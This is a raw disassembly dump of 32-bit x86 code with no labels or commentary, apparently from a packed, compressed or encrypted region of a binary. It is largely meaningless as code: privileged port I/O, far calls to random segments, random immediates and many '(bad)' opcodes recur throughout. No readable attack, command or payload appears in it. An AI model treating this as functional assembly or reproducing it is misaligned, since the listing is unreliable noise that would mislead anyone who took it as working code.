  41564e:	aaa    
  41564f:	aam    0xd5
  415651:	in     eax,dx
  415652:	stc    
  415653:	out    0x3,al
  415655:	add    BYTE PTR [eax-0x591cd0b0],ch
  41565b:	iret   
  41565c:	or     al,BYTE PTR [eax-0x6e]
  41565f:	xor    esi,DWORD PTR [ebx+0x716b1499]
  415665:	test   al,0x18
  415667:	cmp    DWORD PTR [eax],edi
  415669:	mov    bl,0x98
  41566b:	dec    ebp
  41566c:	push   esp
  41566d:	ret    0x5ead
  415670:	repnz mov ds:0x4bedfacd,al
  415676:	push   edi
  415677:	std    
  415678:	pusha  
  415679:	das    
  41567a:	and    ch,dh
  41567c:	or     eax,0xc92a1a8f
  415681:	jo     0x4156bd
  415683:	mov    dl,0xb5
  415685:	and    bl,ch
  415687:	je     0x415664
  415689:	and    BYTE PTR [ebp+0x4e],dl
  41568c:	xchg   ecx,eax
  41568d:	mov    edx,DWORD PTR [edx]
  41568f:	cmp    bl,BYTE PTR [ebx+edx*8-0x49]
  415693:	outs   dx,DWORD PTR ds:[esi]
  415694:	or     BYTE PTR [ebp+eax*4-0x55],al
  415698:	les    eax,FWORD PTR [ebx]
  41569a:	mov    WORD PTR [esi],gs
  41569c:	pop    es
  41569d:	mov    BYTE PTR [ecx],al
  41569f:	jo     0x415625
  4156a1:	jb     0x41566b
  4156a3:	pop    ebx
  4156a4:	leave  
  4156a5:	and    DWORD PTR [ebp+0x4c],esp
  4156a8:	jg     0x415632
  4156aa:	inc    ebp
  4156ab:	call   0xcf6d:0x17fd6270
  4156b2:	cli    
  4156b3:	or     eax,0x9fa57d68
  4156b8:	and    al,0x73
  4156ba:	mov    eax,ds:0xfd82484b
  4156bf:	fld    DWORD PTR [ebx]
  4156c1:	pop    es
  4156c2:	ss add al,BYTE PTR ss:[ecx+esi*8]
  4156c7:	(bad)  
  4156c8:	loopne 0x415730
  4156ca:	(bad)  
  4156cb:	sub    DWORD PTR [edi+ebx*4],ebp
  4156ce:	das    
  4156cf:	fild   DWORD PTR [edx]
  4156d1:	mov    ah,0xd1
  4156d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d4:	in     al,0xa6
  4156d6:	push   es
  4156d7:	push   edx
  4156d8:	cli    
  4156d9:	les    bp,DWORD PTR [ebp-0x38]
  4156dd:	fiadd  DWORD PTR [esi-0x127ec89e]
  4156e3:	icebp  
  4156e4:	mov    ds:0x5d5ad833,al
  4156e9:	(bad)  
  4156ea:	loop   0x41570e
  4156ec:	adc    ecx,DWORD PTR [ecx-0x6e40f6c2]
  4156f2:	test   eax,0xd3a196ee
  4156f7:	gs push cs
  4156f9:	repz add ch,BYTE PTR [eax+0x5a261c46]
  415700:	xchg   dh,cl
  415702:	ret    
  415703:	out    dx,al
  415704:	jnp    0x41569d
  415706:	mov    ebx,0x863f1396
  41570b:	add    eax,DWORD PTR [edx+0x25]
  41570e:	fs fwait
  415710:	scas   al,BYTE PTR es:[edi]
  415711:	fimul  WORD PTR [eax+eax*8+0x6e]
  415715:	mov    bl,0x4c
  415717:	fmul   QWORD PTR [ebx+0x64]
  41571a:	dec    edi
  41571b:	(bad)  
  41571d:	loopne 0x415723
  41571f:	jecxz  0x4156e1
  415721:	push   edx
  415722:	and    al,0xb0
  415724:	stc    
  415725:	loopne 0x415731
  415727:	sub    esi,DWORD PTR [ecx+0x5f169527]
  41572d:	sub    BYTE PTR [edi+0x14],dl
  415730:	xchg   ecx,eax
  415731:	xchg   DWORD PTR [esi-0x137f2253],esi
  415737:	fisttp DWORD PTR [eax+0x41]
  41573a:	pusha  
  41573b:	ja     0x41575a
  41573d:	mov    ebx,DWORD PTR [eax]
  41573f:	jecxz  0x415739
  415741:	mov    BYTE PTR [ebx],al
  415743:	fs lahf 
  415745:	nop
  415746:	push   ss
  415747:	icebp  
  415748:	mov    edi,DWORD PTR [esi+0x3b80e33f]
  41574e:	or     DWORD PTR [ecx-0x6b],ecx
  415751:	dec    ebp
  415752:	mov    BYTE PTR [ebp+0x1bd982a3],bh
  415758:	shl    DWORD PTR [edi],1
  41575a:	xchg   ebx,eax
  41575b:	mov    ecx,0x610972b1
  415760:	xchg   edi,eax
  415761:	add    eax,0x8745327e
  415766:	pop    esi
  415767:	sbb    ebx,DWORD PTR [edx+0x16]
  41576a:	dec    eax
  41576b:	add    bl,ah
  41576d:	(bad)  
  41576e:	js     0x415765
  415770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415771:	xor    ah,BYTE PTR [esi-0x7f]
  415774:	test   ch,al
  415776:	xchg   ebx,eax
  415777:	les    edi,FWORD PTR [edi]
  415779:	into   
  41577a:	mov    al,ds:0xc28c6613
  41577f:	test   ecx,ecx
  415781:	dec    edx
  415782:	pop    esi
  415783:	ret    
  415784:	jns    0x415743
  415786:	jne    0x4157fb
  415788:	sahf   
  415789:	popa   
  41578a:	pop    es
  41578b:	lock add BYTE PTR [ecx+0x5bfc2f87],cl
  415792:	pop    ds
  415793:	xchg   esp,eax
  415794:	neg    BYTE PTR [esi+ecx*4]
  415797:	push   edx
  415798:	and    DWORD PTR [eax],esi
  41579a:	out    0x5f,al
  41579c:	call   0x6165:0x23587f13
  4157a3:	nop
  4157a4:	jp     0x4157f5
  4157a6:	cmp    al,0xda
  4157a8:	xchg   ebp,eax
  4157a9:	or     ebx,eax
  4157ab:	daa    
  4157ac:	xchg   edx,eax
  4157ad:	in     al,dx
  4157ae:	xchg   edi,eax
  4157af:	xor    eax,0x1223979d
  4157b4:	in     eax,dx
  4157b5:	and    ecx,esi
  4157b7:	psubw  mm1,QWORD PTR [edi+0x61]
  4157bb:	push   esp
  4157bc:	lea    ebp,[eax+0x51335365]
  4157c2:	lds    edx,FWORD PTR [ebx-0x38]
  4157c5:	xor    cl,BYTE PTR [edi-0x3f77fc6]
  4157cb:	inc    ecx
  4157cc:	sbb    BYTE PTR [eax-0x41],ch
  4157cf:	or     al,0xe2
  4157d1:	push   ebx
  4157d2:	ja     0x4157f6
  4157d4:	mov    bh,0x3d
  4157d6:	rol    ah,cl
  4157d8:	cdq    
  4157d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157da:	fucom  st(5)
  4157dc:	pusha  
  4157dd:	shl    DWORD PTR [edx+0x34],1
  4157e0:	dec    edx
  4157e1:	fnstcw WORD PTR [esi]
  4157e3:	cdq    
  4157e4:	adc    ebx,DWORD PTR [esi+0x246f854f]
  4157ea:	stos   BYTE PTR es:[edi],al
  4157eb:	fbstp  TBYTE PTR [ecx-0x19]
  4157ee:	inc    ebx
  4157ef:	and    eax,0xfa10f11f
  4157f4:	sub    esi,esi
  4157f6:	pop    ebx
  4157f7:	adc    ecx,DWORD PTR [ecx]
  4157f9:	sub    eax,0x6e90841e
  4157fe:	and    al,BYTE PTR ds:0xab1790c9
  415804:	sbb    al,BYTE PTR [edi-0x2e]
  415807:	ss sti 
  415809:	push   ebx
  41580a:	lea    ebp,[esi+0x44a047d3]
  415810:	int3   
  415811:	icebp  
  415812:	mov    bl,0xee
  415814:	xor    BYTE PTR [ecx],0x6
  415817:	pop    eax
  415818:	add    eax,0x82404b40
  41581d:	inc    ebx
  41581e:	xchg   edi,eax
  41581f:	jl     0x4157ea
  415821:	out    dx,al
  415822:	pop    eax
  415823:	lahf   
  415824:	mov    ah,BYTE PTR [ebx]
  415826:	(bad)  
  415827:	(bad)  
  415829:	retf   0x9aa
  41582c:	fdivr  DWORD PTR [esi]
  41582e:	inc    ebp
  41582f:	mov    ah,0x2f
  415831:	rcr    BYTE PTR [edx+0x75],cl
  415834:	cwde   
  415835:	or     BYTE PTR [esi-0x5a],bh
  415838:	fdivr  QWORD PTR [eax+0x3c]
  41583b:	outs   dx,DWORD PTR ds:[esi]
  41583c:	add    ebx,DWORD PTR [edx]
  41583e:	jle    0x415898
  415840:	jp     0x41582f
  415842:	rcr    ebp,cl
  415844:	jg     0x415877
  415846:	popf   
  415847:	or     esp,edx
  415849:	out    dx,al
  41584a:	(bad)  
  41584b:	in     eax,dx
  41584c:	adc    ebx,DWORD PTR es:[eax+0x2731b99f]
  415853:	inc    eax
  415854:	iret   
  415855:	jecxz  0x4157db
  415857:	loopne 0x415891
  415859:	jge    0x4158c0
  41585b:	push   cs
  41585c:	hlt    
  41585d:	ins    BYTE PTR es:[edi],dx
  41585e:	push   ecx
  41585f:	das    
  415860:	mov    ?,WORD PTR [eax]
  415862:	out    dx,al
  415863:	xchg   ebx,eax
  415864:	lods   al,BYTE PTR ds:[esi]
  415865:	int    0x30
  415867:	sbb    DWORD PTR [edi+0x58fdcd36],ebx
  41586d:	dec    ecx
  41586e:	cs fs das 
  415871:	and    eax,eax
  415873:	pusha  
  415874:	add    DWORD PTR [ecx+0x50555dd6],ebx
  41587a:	xor    al,0x35
  41587c:	inc    esi
  41587d:	xchg   ebp,eax
  41587e:	loope  0x415856
  415880:	pop    ss
  415881:	jns    0x415826
  415883:	sub    DWORD PTR [edi-0x4],edx
  415886:	(bad)  
  415887:	shl    ch,1
  415889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41588a:	(bad)  
  41588b:	mov    eax,0xf19964a5
  415890:	(bad)  
  415891:	test   DWORD PTR ds:[edi+0x473ae394],esi
  415898:	jl     0xba23228b
  41589e:	ds (bad) 
  4158a0:	lods   eax,DWORD PTR ds:[esi]
  4158a1:	add    DWORD PTR ds:0xe64f4617,edi
  4158a7:	mov    ebp,0x6988b8f3
  4158ac:	mov    al,ds:0x745e2912
  4158b1:	das    
  4158b2:	fwait
  4158b3:	lods   al,BYTE PTR ds:[esi]
  4158b4:	inc    esi
  4158b5:	rcr    dh,1
  4158b7:	das    
  4158b8:	(bad)  
  4158b9:	pop    ebp
  4158ba:	int    0xc
  4158bc:	(bad)  
  4158bd:	mov    eax,ds:0x5de7f007
  4158c2:	jbe    0x4158ee
  4158c4:	daa    
  4158c5:	push   esi
  4158c6:	inc    ecx
  4158c7:	jecxz  0x41584e
  4158c9:	push   ebx
  4158ca:	loope  0x415910
  4158cc:	outs   dx,DWORD PTR fs:[esi]
  4158ce:	imul   ecx,eax,0xed7254bd
  4158d4:	in     al,dx
  4158d5:	mov    eax,0x28ca9193
  4158da:	aam    0xc8
  4158dc:	popa   
  4158dd:	mov    cl,0xc0
  4158df:	ins    DWORD PTR es:[edi],dx
  4158e0:	pushf  
  4158e1:	(bad)  
  4158e2:	sub    ch,bh
  4158e4:	push   esp
  4158e5:	aas    
  4158e6:	call   0xfd5c:0xf6fe4303
  4158ed:	and    eax,0xc5e1ffdf
  4158f2:	or     al,0x6c
  4158f4:	sub    edi,ebx
  4158f6:	enter  0xc646,0xa7
  4158fa:	xchg   ecx,eax
  4158fb:	repnz xor BYTE PTR [esi],dl
  4158fe:	xchg   esi,eax
  4158ff:	data16 mov bh,0x11
  415902:	and    bh,BYTE PTR [esi-0x25]
  415905:	sub    BYTE PTR [edx],bh
  415907:	cmp    DWORD PTR [edx+eax*1-0x7b],ecx
  41590b:	neg    BYTE PTR [ebp+0x44]
  41590e:	cmp    al,ah
  415910:	lock and DWORD PTR [ecx+0x2],ebx
  415914:	inc    esp
  415915:	out    dx,al
  415916:	pop    ebx
  415917:	test   eax,0xb7e3d5e4
  41591c:	imul   esi,DWORD PTR [ecx-0x592edea9],0x45362485
  415926:	mov    DWORD PTR ds:0x176606f,esi
  41592c:	mov    ebx,0x4f96ce0d
  415931:	pushf  
  415932:	sbb    DWORD PTR [ebx],edi
  415934:	ja     0x4158e2
  415936:	test   DWORD PTR [esp+ebx*8-0x5d978df3],edi
  41593d:	rol    DWORD PTR [eax-0x685bdb2],1
  415943:	inc    ebp
  415944:	(bad)
  415948:	shr    DWORD PTR [edx-0x7ff6dc1d],1
  41594e:	out    0xd9,al
  415950:	inc    eax
  415951:	dec    eax
  415952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415953:	nop
  415954:	xchg   edx,eax
  415955:	xchg   ebp,eax
  415956:	not    ecx
  415958:	clc    
  415959:	pop    ebx
  41595a:	sub    ch,BYTE PTR [esi-0x20]
  41595d:	test   eax,0x9e52690
  415962:	int3   
  415963:	lahf   
  415964:	adc    eax,0x2e791745
  415969:	std    
  41596a:	ins    BYTE PTR es:[edi],dx
  41596b:	add    edi,ecx
  41596d:	icebp  
  41596e:	js     0x415936
  415970:	fcmove st,st(4)
  415972:	call   0xc3f3:0xdcc3474d
  415979:	(bad)  
  41597b:	enter  0x4a9a,0xde
  41597f:	mov    cl,al
  415981:	adc    BYTE PTR [ebp-0x2c159307],dl
  415987:	mov    ah,bl
  415989:	xor    BYTE PTR [eax-0x5f19df58],ah
  41598f:	sub    al,0x74
  415991:	pop    ds
  415992:	jno    0x4159fc
  415994:	sbb    al,0xac
  415996:	adc    eax,0x59721d31
  41599b:	push   esp
  41599c:	mov    eax,0xe41965b4
  4159a1:	rcl    BYTE PTR ds:0x637a77eb,1
  4159a7:	mov    ebp,0x5483d83f
  4159ac:	mov    ecx,0xe315d9b8
  4159b1:	dec    eax
  4159b2:	pop    edx
  4159b3:	adc    DWORD PTR [eax+0x52],esp
  4159b6:	sub    eax,0x5f936efb
  4159bb:	fst    DWORD PTR [edi-0x3d283244]
  4159c1:	js     0x41595b
  4159c3:	(bad)  
  4159c4:	in     al,dx
  4159c5:	cmp    esi,DWORD PTR [ebp-0x48bb631f]
  4159cb:	fild   WORD PTR [eax+edx*2]
  4159ce:	and    edi,esi
  4159d0:	dec    esp
  4159d1:	js     0x415a49
  4159d3:	call   0x66af5a95
  4159d8:	sbb    BYTE PTR [edx],ch
  4159da:	pop    esi
  4159db:	jae    0x415a26
  4159dd:	push   0x48da4e45
  4159e2:	outs   dx,DWORD PTR ds:[esi]
  4159e3:	call   0x1227820c
  4159e8:	pop    ecx
  4159e9:	(bad)  
  4159ea:	pop    ss
  4159eb:	cwde   
  4159ec:	dec    ebx
  4159ed:	out    0xfd,al
  4159ef:	(bad)  
  4159f0:	iret   
  4159f1:	add    al,0x74
  4159f3:	ds (bad) 
  4159f5:	fwait
  4159f6:	mov    edi,0xba42758b
  4159fb:	dec    edx
  4159fc:	ja     0x415a73
  4159fe:	mov    al,ds:0xb924e5da
  415a03:	stos   BYTE PTR es:[edi],al
  415a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a05:	cli    
  415a06:	std    
  415a07:	dec    esi
  415a08:	shr    DWORD PTR ds:0x38266c71,1
  415a0e:	xor    ebp,DWORD PTR [ebp+0x59]
  415a11:	add    esp,0x6d40af97
  415a17:	xlat   BYTE PTR ds:[ebx]
  415a18:	hlt    
  415a19:	pop    ss
  415a1a:	out    dx,eax
  415a1b:	and    BYTE PTR [ebx+eiz*2+0x70664ff7],al
  415a22:	fisubr WORD PTR [eax+0x3f]
  415a25:	in     eax,0x6c
  415a27:	and    edx,DWORD PTR [eax+0x6c]
  415a2a:	pop    es
  415a2b:	int3   
  415a2c:	out    dx,eax
  415a2d:	and    dl,BYTE PTR [esi-0xc]
  415a30:	shl    DWORD PTR [esi],1
  415a32:	sub    esp,esi
  415a34:	adc    BYTE PTR [ebx],ah
  415a36:	jg     0x4159b9
  415a38:	retf   0xc19a
  415a3b:	call   0x436964ca
  415a40:	sbb    al,0x8f
  415a42:	dec    DWORD PTR [ebp+0x74660f81]
  415a48:	mov    eax,ds:0xbca79a4e
  415a4d:	mov    esi,0x251ecce1
  415a52:	ret    0x14d
  415a55:	shl    BYTE PTR [ebx-0x5a957103],cl
  415a5b:	(bad)  
  415a5c:	push   0x24
  415a5e:	mov    ah,BYTE PTR [ecx-0x24459cb]
  415a64:	(bad)  
  415a65:	outs   dx,DWORD PTR ds:[esi]
  415a66:	and    al,0x17
  415a68:	out    0x58,eax
  415a6a:	popf   
  415a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a6c:	fisubr DWORD PTR ds:0x37ff477e
  415a72:	push   ds
  415a73:	pushf  
  415a74:	inc    ebx
  415a75:	shl    ecx,1
  415a77:	stc    
  415a78:	xor    BYTE PTR [esi],ah
  415a7a:	xchg   ecx,eax
  415a7b:	rcr    esp,0xe9
  415a7e:	sbb    eax,ebx
  415a80:	(bad)  
  415a81:	mov    dl,0x1f
  415a83:	cwde   
  415a84:	aas    
  415a85:	rol    BYTE PTR [ecx],1
  415a87:	jecxz  0x415a44
  415a89:	stos   DWORD PTR es:[edi],eax
  415a8a:	mov    al,0x95
  415a8c:	lea    ecx,[eax]
  415a8e:	stc    
  415a8f:	jo     0x415ae4
  415a91:	cmp    eax,0x76f712b9
  415a96:	into   
  415a97:	outs   dx,BYTE PTR ds:[esi]
  415a98:	hlt    
  415a99:	and    al,BYTE PTR ss:[eax+ecx*2+0x35ffcd74]
  415aa1:	fmul   QWORD PTR [esi+0x23a72175]
  415aa7:	loop   0x415add
  415aa9:	mov    dh,0xae
  415aab:	cmp    ebx,DWORD PTR [ecx+0x7d3736d9]
  415ab1:	or     dh,dh
  415ab3:	inc    edi
  415ab4:	xor    bl,ch
  415ab6:	ja     0x415ad8
  415ab8:	lock sahf 
  415aba:	jmp    0x415a88
  415abc:	or     al,0x9
  415abe:	add    edi,esi
  415ac0:	or     bh,BYTE PTR [edi-0x20]
  415ac3:	mov    ah,0x2e
  415ac5:	call   0xaece4252
  415aca:	xchg   edx,eax
  415acb:	jge    0x415ad5
  415acd:	cmp    dh,BYTE PTR [edi]
  415acf:	enter  0x7dca,0x53
  415ad3:	jnp    0x415b15
  415ad5:	rol    BYTE PTR [edi+0x74],0xb9
  415ad9:	jecxz  0x415ab9
  415adb:	and    BYTE PTR [eax],0xa2
  415ade:	and    ah,BYTE PTR [ecx]
  415ae0:	je     0x415ac1
  415ae2:	lds    edi,FWORD PTR [edx]
  415ae4:	lock mov ah,0x40
  415ae7:	and    eax,0x7102c594
  415aec:	mov    dl,0x49
  415aee:	loopne 0x415b3d
  415af0:	jmp    0x415ae9
  415af2:	retf   
  415af3:	jge    0x415aae
  415af5:	in     eax,dx
  415af6:	push   esi
  415af7:	lea    esp,[esi+edx*8]
  415afa:	fsub   st(1),st
  415afc:	pop    ebp
  415afd:	popa   
  415afe:	jecxz  0x415b1f
  415b00:	adc    al,BYTE PTR [edi]
  415b02:	push   es
  415b03:	shl    BYTE PTR [ebx+0x5b],1
  415b06:	stos   BYTE PTR es:[edi],al
  415b07:	xchg   dh,bl
  415b09:	in     eax,dx
  415b0a:	dec    esi
  415b0b:	ins    DWORD PTR es:[edi],dx
  415b0c:	xchg   ebp,ecx
  415b0e:	push   edx
  415b0f:	(bad)  
  415b11:	stos   DWORD PTR es:[edi],eax
  415b12:	sub    ebx,DWORD PTR [ebx]
  415b14:	sbb    bh,al
  415b16:	(bad)  
  415b17:	jmp    0x415b04
  415b19:	shr    DWORD PTR [ebx+0x30],1
  415b1c:	rcr    DWORD PTR [edx+0x7e],cl
  415b1f:	or     al,0x6f
  415b21:	mov    ds:0x11523ecf,eax
  415b26:	cwde   
  415b27:	jae    0x415b2b
  415b29:	and    esp,DWORD PTR ds:[ebx]
  415b2c:	out    dx,eax
  415b2d:	xor    BYTE PTR ds:0xa5dd,0xb2
  415b33:	adc    al,0xae
  415b35:	inc    edi
  415b36:	out    0xab,al
  415b38:	push   esp
  415b39:	rol    al,1
  415b3b:	inc    edi
  415b3c:	pop    edx
  415b3d:	jne    0x415ac6
  415b3f:	aad    0xcd
  415b41:	scas   al,BYTE PTR es:[edi]
  415b42:	pop    ebp
  415b43:	xchg   DWORD PTR [edi-0x28],ebx
  415b46:	addr16 dec ebp
  415b48:	test   al,0x88
  415b4a:	xchg   edi,ebp
  415b4c:	xchg   BYTE PTR [esi+0x4c],ch
  415b4f:	stos   DWORD PTR es:[edi],eax
  415b50:	sbb    bh,BYTE PTR [edi+0x62]
  415b53:	mov    al,ds:0x8df10b6
  415b58:	mov    dl,0xc
  415b5a:	jo     0x415b49
  415b5c:	adc    BYTE PTR [eax+0x7e],ch
  415b5f:	fs std 
  415b61:	in     al,0x35
  415b63:	dec    ebp
  415b64:	loop   0x415bdc
  415b66:	outs   dx,BYTE PTR ds:[esi]
  415b67:	add    BYTE PTR [edi],ah
  415b69:	imul   esi,edi,0xa766791b
  415b6f:	ins    DWORD PTR es:[edi],dx
  415b70:	jb     0x415bcf
  415b72:	dec    ebx
  415b73:	sub    DWORD PTR [edx+0x65af29ca],eax
  415b79:	add    eax,0xacaae29d
  415b7e:	(bad)  
  415b7f:	pop    eax
  415b80:	jae    0x415bb4
  415b82:	adc    BYTE PTR [edi-0x32],ch
  415b85:	mov    bh,0x58
  415b87:	push   eax
  415b88:	jl     0x415bd4
  415b8a:	in     eax,0xfb
  415b8c:	daa    
  415b8d:	adc    BYTE PTR [ecx-0x12],ch
  415b90:	fcmove st,st(7)
  415b92:	xchg   edx,eax
  415b93:	rcl    DWORD PTR [esi],1
  415b95:	xchg   edx,eax
  415b96:	sbb    ebp,DWORD PTR [ecx-0x7]
  415b99:	daa    
  415b9a:	aaa    
  415b9b:	cmp    bl,BYTE PTR ds:0x839a9e17
  415ba1:	sub    ecx,DWORD PTR [edi]
  415ba3:	mov    ds:0x74dd6f99,al
  415ba8:	jmp    FWORD PTR [edx+0xd]
  415bab:	mov    ds:0x4912f31c,eax
  415bb0:	cli    
  415bb1:	enter  0xdfad,0x23
  415bb5:	or     DWORD PTR [ebx+edi*8+0x4e4af117],esp
  415bbc:	add    BYTE PTR [eax+edx*2],dh
  415bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bc0:	mov    esi,0xa7c16335
  415bc5:	fmul   DWORD PTR [ebp-0x68]
  415bc8:	out    0x48,al
  415bca:	and    DWORD PTR [ecx],edi
  415bcc:	je     0x415bc9
  415bce:	cmp    ecx,ebp
  415bd0:	jnp    0x415ba0
  415bd2:	test   eax,0x6dc55d6e
  415bd7:	shl    dh,1
  415bd9:	iret   
  415bda:	push   esp
  415bdb:	stos   BYTE PTR es:[edi],al
  415bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bdd:	adc    bh,BYTE PTR [edi-0x1a]
  415be0:	lahf   
  415be1:	arpl   WORD PTR [ebp+0x37504333],cx
  415be7:	cmp    eax,0x2cb67695
  415bec:	mov    edx,0xeb1c84c2
  415bf1:	inc    esi
  415bf2:	js     0x415bdc
  415bf4:	pop    edi
  415bf5:	inc    ebp
  415bf6:	retf   0xcd1
  415bf9:	xchg   BYTE PTR [edi+ebx*4+0x61],dl
  415bfd:	cmp    eax,0x60eb4e2e
  415c02:	bound  ebp,QWORD PTR [ecx-0x2c26da7f]
  415c08:	arpl   ax,si
  415c0a:	xchg   ecx,eax
  415c0b:	lods   eax,DWORD PTR ds:[esi]
  415c0c:	(bad)  
  415c0d:	dec    ecx
  415c0e:	into   
  415c0f:	and    edi,DWORD PTR [edx+ebx*8+0x77]
  415c13:	cmp    eax,0xe5cdeb3a
  415c18:	sbb    al,0xe8
  415c1a:	sub    DWORD PTR [ebx+edi*8],ebx
  415c1d:	rcr    DWORD PTR [eax-0x3d041ebf],cl
  415c23:	mov    bh,0x33
  415c25:	mov    cl,0x56
  415c27:	cwde   
  415c28:	js     0x415c8b
  415c2a:	adc    BYTE PTR [edx-0x4e],al
  415c2d:	mov    esi,0x4c8e8505
  415c32:	repnz dec eax
  415c34:	aad    0x1c
  415c36:	or     bl,bh
  415c38:	popf   
  415c39:	pop    eax
  415c3a:	bound  esi,QWORD PTR [ebx]
  415c3c:	hlt    
  415c3d:	enter  0xeb9a,0xee
  415c41:	and    DWORD PTR [esi+0x4e],ebp
  415c44:	das    
  415c45:	in     al,dx
  415c46:	mov    ch,0xe4
  415c49:	pop    ebp
  415c4a:	fwait
  415c4b:	add    edx,esp
  415c4d:	sub    eax,0x5303392e
  415c52:	sub    cl,BYTE PTR [ebx+0x72edfafe]
  415c58:	sub    eax,0x45857333
  415c5d:	xor    al,BYTE PTR [edx+0x2e]
  415c60:	loop   0x415c04
  415c62:	div    DWORD PTR [ebx-0x32]
  415c65:	shr    al,1
  415c67:	xor    dl,BYTE PTR [ecx]
  415c69:	or     al,bh
  415c6b:	cmp    edx,0xfbca6bfa
  415c71:	cdq    
  415c72:	pop    ebx
  415c73:	fwait
  415c74:	(bad)  
  415c75:	ds or  eax,0x47fe207a
  415c7b:	sub    dh,ch
  415c7d:	stos   DWORD PTR es:[edi],eax
  415c7e:	call   0x19a8:0xba12e4e1
  415c85:	pop    esp
  415c86:	setp   BYTE PTR es:[edx-0x7353a852]
  415c8e:	sbb    ecx,ebx
  415c90:	inc    edx
  415c91:	(bad)  
  415c92:	int    0x1
  415c94:	ror    DWORD PTR [edi],0x79
  415c97:	ja     0x415cd1
  415c99:	mov    ds:0x9d9eecd4,al
  415c9e:	push   cs
  415c9f:	push   ebp
  415ca0:	mov    ecx,0x8f224463
  415ca5:	dec    edi
  415ca6:	popf   
  415ca7:	neg    DWORD PTR [ebx-0x2a687776]
  415cad:	fstp   DWORD PTR [edx]
  415caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb0:	jo     0x415cd8
  415cb2:	popa   
  415cb3:	mov    dl,0xb3
  415cb5:	ret    0x9b80
  415cb8:	fdivr  DWORD PTR [ecx+0x1a]
  415cbb:	and    al,0x1b
  415cbd:	jbe    0x415c85
  415cbf:	aad    0xd9
  415cc1:	pop    ecx
  415cc2:	fmul   QWORD PTR [esi-0x5f]
  415cc5:	data16 fisub WORD PTR [ebx]
  415cc8:	jp     0x415c6f
  415cca:	(bad)  
  415ccb:	iret   
  415ccc:	cmp    al,0x73
  415cce:	int3   
  415ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd0:	mov    al,ds:0xff2ec758
  415cd5:	in     al,dx
  415cd6:	sub    DWORD PTR [ebp-0x5d],eax
  415cd9:	push   esi
  415cda:	inc    edx
  415cdb:	push   ss
  415cdc:	and    dl,BYTE PTR [edi+ebx*1-0x70]
  415ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce1:	mov    esp,0xeff9ac58
  415ce6:	dec    ebp
  415ce7:	xchg   esi,eax
  415ce8:	inc    esi
  415ce9:	add    dl,BYTE PTR [edx]
  415ceb:	push   esi
  415cec:	or     eax,0x1ff92d14
  415cf1:	cmp    esp,0xf54dbf54
  415cf7:	bound  ebx,QWORD PTR [eax-0x5d]
  415cfa:	(bad)  
  415cfc:	pop    ecx
  415cfd:	mov    esp,DWORD PTR [edi+0x7d2d1bfc]
  415d03:	dec    ecx
  415d04:	rcr    BYTE PTR [ecx-0xb1176cf],1
  415d0a:	or     DWORD PTR [eax+eiz*4],0xffffffca
  415d0e:	or     eax,DWORD PTR [edx+0x6a8a3a27]
  415d14:	ins    BYTE PTR es:[edi],dx
  415d15:	dec    edi
  415d16:	test   al,0x61
  415d18:	xchg   esp,eax
  415d19:	pop    eax
  415d1a:	bound  ecx,QWORD PTR [esi]
  415d1c:	pushf  
  415d1d:	inc    edi
  415d1e:	pop    DWORD PTR [esi+0x3a60811f]
  415d24:	cmc    
  415d25:	loop   0x415d9d
  415d27:	jb     0x415d8b
  415d29:	xor    al,0x97
  415d2b:	sub    DWORD PTR [ebx+0x14bbed1e],eax
  415d31:	lods   al,BYTE PTR ds:[esi]
  415d32:	jo     0x415d1c
  415d34:	or     ah,BYTE PTR [edi-0x6d]
  415d37:	stos   BYTE PTR es:[edi],al
  415d38:	xchg   DWORD PTR [edi-0x49fc22b2],edx
  415d3e:	cwde   
  415d3f:	std    
  415d40:	sbb    BYTE PTR [eax-0xf92c150],al
  415d46:	ret    
  415d47:	sbb    al,0xcc
  415d49:	mov    eax,ds:0xfd491ba3
  415d4e:	adc    cl,BYTE PTR [edi+0x78805487]
  415d54:	ds pop ecx
  415d56:	popa   
  415d57:	nop
  415d58:	call   0xe9a:0x9865be7c
  415d5f:	mov    eax,0x950bf990
  415d64:	stc    
  415d65:	fistp  QWORD PTR [eax+0x71]
  415d68:	fstp   QWORD PTR [edx-0x49]
  415d6b:	push   es
  415d6c:	lahf   
  415d6d:	int    0x86
  415d6f:	or     BYTE PTR [ebx],cl
  415d71:	call   0x98fa3491
  415d76:	push   ds
  415d77:	ja     0x415d6e
  415d79:	test   WORD PTR [edx+0x85e26ef],bx
  415d80:	pushf  
  415d81:	mov    ebp,0x8fdd2bc9
  415d86:	xchg   edx,eax
  415d87:	sti    
  415d88:	adc    eax,0x5a0291d0
  415d8d:	lock and edx,DWORD PTR [ebx]
  415d90:	cmp    al,0xaf
  415d92:	and    DWORD PTR cs:[ecx+0x7e],edi
  415d96:	int3   
  415d97:	sbb    eax,0x856333aa
  415d9c:	push   edi
  415d9d:	inc    esp
  415d9e:	int    0xc0
  415da0:	shl    BYTE PTR [edi+0x3004edf2],cl
  415da6:	popa   
  415da7:	cmp    BYTE PTR [esi+0x1],dh
  415daa:	ja     0x415e0d
  415dac:	jecxz  0x415d4d
  415dae:	lahf   
  415daf:	(bad)  
  415db0:	shl    DWORD PTR [edx+0x68c1b40d],cl
  415db6:	inc    ebp
  415db7:	mov    BYTE PTR [ebx-0x356dabbe],ch
  415dbd:	mov    ecx,0x8bf62742
  415dc2:	mov    eax,ds:0xc96fc08f
  415dc7:	push   ss
  415dc8:	add    al,0x2
  415dca:	es mov dh,0x9d
  415dcd:	lea    esi,cs:[esp+ecx*8]
  415dd1:	(bad)  
  415dd2:	mov    ah,0x22
  415dd4:	adc    al,0xdb
  415dd6:	sub    edx,esi
  415dd8:	cmp    DWORD PTR [edi],esp
  415dda:	mov    ebx,0x44a27177
  415ddf:	data16 jne 0x415d64
  415de2:	les    ecx,FWORD PTR [esi]
  415de4:	pop    esi
  415de5:	scas   al,BYTE PTR es:[edi]
